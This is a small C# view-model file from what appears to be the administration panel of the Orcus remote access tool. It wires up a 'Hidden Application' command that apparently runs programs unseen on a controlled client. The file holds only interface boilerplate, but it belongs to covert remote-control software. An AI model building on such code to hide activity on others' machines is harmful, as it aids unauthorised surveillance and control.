using Orcus.Administration.Commands.HiddenApplication;
using Orcus.Administration.Plugins.CommandViewPlugin;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    public class HiddenApplicationViewModel : CommandView
    {
        private HiddenApplicationCommand _hiddenApplicationCommand;

        public override string Name { get; } = "Hidden Application";
        public override Category Category { get; } = Category.System;

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _hiddenApplicationCommand = clientController.Commander.GetCommand<HiddenApplicationCommand>();
        }
    }
}